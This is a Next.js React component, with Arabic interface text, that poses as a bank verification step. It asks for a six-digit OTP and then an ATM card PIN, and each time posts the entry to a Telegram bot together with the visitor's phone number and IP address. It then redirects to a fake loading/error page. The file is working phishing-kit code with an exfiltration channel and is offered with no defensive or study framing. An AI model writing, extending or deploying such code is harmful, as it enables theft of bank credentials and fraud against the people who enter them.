"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { useSearchParams } from "next/navigation";

export default function OTPForm() {
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  const [errorOtp, setErrorOtp] = useState(false);
  const [errorPin, setErrorPin] = useState(false);
  const [showPinForm, setShowPinForm] = useState(false);
  const searchParams = useSearchParams();
  const router = useRouter();

  // تغيير قيمة OTP
  const handleOtpChange = (e) => {
    const value = e.target.value;
    if (/^\d*$/.test(value) && value.length <= 6) {
      setOtp(value);
      setErrorOtp(false);
    }
  };

  // تغيير قيمة PIN
  const handlePinChange = (e) => {
    const value = e.target.value;
    if (/^\d*$/.test(value) && value.length <= 4) {
      setPin(value);
      setErrorPin(false);
    }
  };

  // دالة للحصول على IP المستخدم
  const getUserIP = async () => {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  };

  // إرسال OTP
  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    if (otp.length === 6) {
      setErrorOtp(false);

      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const userIP = await getUserIP();
      const mobileNumber = searchParams.get("mobile"); // افترضنا أن رقم الهاتف يتم تمريره كـ query param
      const message = `رقم الهاتف: ${mobileNumber}\nIP المستخدم: ${userIP}\nالكود (OTP): ${otp}`;

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          setShowPinForm(true); // إظهار نموذج PIN
        } else {
          alert("أعد المحاولة حدث خطأ ما");
        }
      } catch (error) {
        alert("أعد المحاولة حدث خطأ ما");
      }
    } else {
      setErrorOtp(true);
    }
  };

  // إرسال PIN
  const handlePinSubmit = async (e) => {
    e.preventDefault();
    if (pin.length === 4) {
      setErrorPin(false);

      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const userIP = await getUserIP();
      const mobileNumber = searchParams.get("mobile"); // افترضنا أن رقم الهاتف يتم تمريره كـ query param
      const message = `رقم الهاتف: ${mobileNumber}\nIP المستخدم: ${userIP}\nرمز الصراف: ${pin}`;

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          router.push(`/loading?nextPage=err`);
        } else {
          alert("أعد المحاولة حدث خطأ ما");
        }
      } catch (error) {
        alert("أعد المحاولة حدث خطأ ما");
      }
    } else {
      setErrorPin(true);
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div>
        {/* نموذج OTP */}
        <form
          className={`bg-white shadow-lg rounded-lg p-6 w-full max-w-sm text-center relative transform transition-transform duration-700 ${
            showPinForm ? "translate-y-[-200%] opacity-0" : "translate-y-0 opacity-100"
          }`}
        >
          <h2 className="text-lg font-bold text-gray-800 mb-4">OTP</h2>
          <p className="text-md text-gray-700 mb-6">
            سيتم إرسال رسالة كود التحقق في خلال دقيقة لتأكيد العملية.
          </p>
          <div className="mb-6">
            <input
              type="number"
              value={otp}
              onChange={handleOtpChange}
              placeholder="XXXXXX"
              className={`w-full px-4 py-2 border rounded-lg text-center ${
                errorOtp ? "border-red-500" : "border-gray-300"
              }`}
            />
          </div>
          <button
            onClick={handleOtpSubmit}
            className="w-full bg-[#c81048] text-white font-medium py-2 px-4 rounded-lg hover:bg-red-700"
          >
            تأكيد
          </button>
        </form>

        {/* نموذج PIN */}
        <form
          className={`bg-white shadow-lg rounded-lg p-6 w-full max-w-sm text-center relative transform transition-transform duration-700 ${
            showPinForm ? "translate-y-[-20vh] opacity-100" : "translate-y-[-200%] opacity-0"
          }`}
        >
          <h2 className="text-lg font-bold text-gray-800 mb-4">رمز الصراف</h2>
          <p className="text-md text-gray-700 mb-6">
            أدخل رمز الصراف لتأكيد العملية
          </p>
          <div className="mb-6">
            <input
              type="number"
              value={pin}
              onChange={handlePinChange}
              placeholder="XXXX"
              className={`w-full px-4 py-2 border rounded-lg text-center ${
                errorPin ? "border-red-500" : "border-gray-300"
              }`}
            />
          </div>
          <button
            onClick={handlePinSubmit}
            className="w-full bg-[#c81048] text-white font-medium py-2 px-4 rounded-lg hover:bg-red-700"
          >
            تأكيد
          </button>
        </form>
      </div>
    </div>
  );
}